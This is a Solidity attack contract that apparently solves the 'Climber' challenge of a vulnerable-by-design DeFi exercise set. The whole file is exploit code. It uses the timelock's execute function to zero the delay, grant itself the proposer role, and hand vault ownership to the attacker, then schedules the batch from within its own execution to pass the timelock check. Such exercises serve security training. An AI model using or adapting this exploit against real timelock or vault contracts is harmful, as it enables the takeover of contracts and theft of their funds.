pragma solidity >=0.8;

import "../../climber/ClimberTimelock.sol";
import "../../climber/ClimberVault.sol";

contract ClimberAttacker {
    ClimberTimelock timelock;
    ClimberVault climberVault;
    address attacker;
    constructor(address payable _timelock, address payable _climberVault) {
       timelock = ClimberTimelock(_timelock);
       climberVault = ClimberVault(_climberVault);
       attacker = msg.sender;
    }
    function attack() external {
        executeOnTimeLock();
    }

    function dataAssignDelayRemove() private returns(address,uint256,bytes memory) {
        bytes memory delayData = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        return (address(timelock), 0, delayData);
    }

    function dataAssignProposer() private returns(address,uint256,bytes memory) {
        bytes memory proposerData = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        return (address(timelock), 0, proposerData);
    }

    function dataTransferOwnership() private returns(address,uint256,bytes memory) {
        bytes memory ownershipData = abi.encodeWithSignature("transferOwnership(address)", attacker);
        return (address(climberVault), 0, ownershipData);
    }

    function scheduleOnTimeLock() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = groupCalls();
        timelock.schedule(targets, values, dataElements, 0);
    }

    function executeOnTimeLock() private {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = groupCalls();
        timelock.execute(targets, values, dataElements, 0);
    }

    function groupCalls() private returns(address[] memory, uint256[] memory, bytes[] memory){
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        {
            (address target1, uint256 value1, bytes memory dataElement1) = dataAssignDelayRemove();
            (address target2, uint256 value2, bytes memory dataElement2) = dataAssignProposer();
            (address target3, uint256 value3, bytes memory dataElement3) = dataTransferOwnership();
            uint256 value4 = 0;
            bytes memory scheduleData = abi.encode(this.scheduleOnTimeLock.selector);
            targets[0] = target1;
            targets[1] = target2;
            targets[2] = target3;
            targets[3] = address(this);
            values[0] = value1;
            values[1] = value2;
            values[2] = value3;
            values[3] = value4;
            dataElements[0] = dataElement1;
            dataElements[1] = dataElement2;
            dataElements[2] = dataElement3;
            dataElements[3] = scheduleData;
        }

        return (targets, values, dataElements);
    }
}